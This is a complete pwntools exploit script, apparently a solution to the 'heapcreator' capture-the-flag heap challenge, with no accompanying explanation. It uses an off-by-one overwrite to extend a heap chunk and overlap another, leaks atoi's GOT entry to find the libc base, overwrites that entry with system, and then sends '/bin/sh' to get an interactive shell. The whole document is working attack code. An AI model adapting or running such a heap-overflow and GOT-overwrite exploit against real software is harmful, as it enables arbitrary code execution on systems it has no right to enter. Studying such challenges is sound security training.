#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./heapcreator"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice :",str(idx))

def add(length,content):
    opt(1)
    p.sendlineafter("Size of Heap :",str(length))
    p.sendlineafter("Content of heap:",str(content))

def free(idx):
    opt(4)
    p.sendlineafter("Index :",str(idx))

def edit(idx,content):
    opt(2)
    p.sendlineafter("Index :",str(idx))
    p.sendlineafter("Content of heap : ",str(content))

def show(idx):
    opt(3)
    p.sendlineafter("Index :",str(idx))

add(0x18,"aaaa") # 0
add(0x10,"aaaa") # 1
edit(0,"b"*0x18 + "\x41") # chunk extend
free(1)
add(0x30,"c"*0x20 + p64(0x30) + p64(elf.got["atoi"]))
show(1)
p.recvuntil("Content : ")
libc_base = u64(p.recv(6).ljust(8,"\0")) - libc.sym["atoi"]
system_addr = libc_base + libc.sym["system"]
log.success("system address id -> " + hex( system_addr ))

edit(1,p64(system_addr))
p.sendline("/bin/sh\x00")

# gdb.attach(p,"set $h=0x603000")

p.interactive()
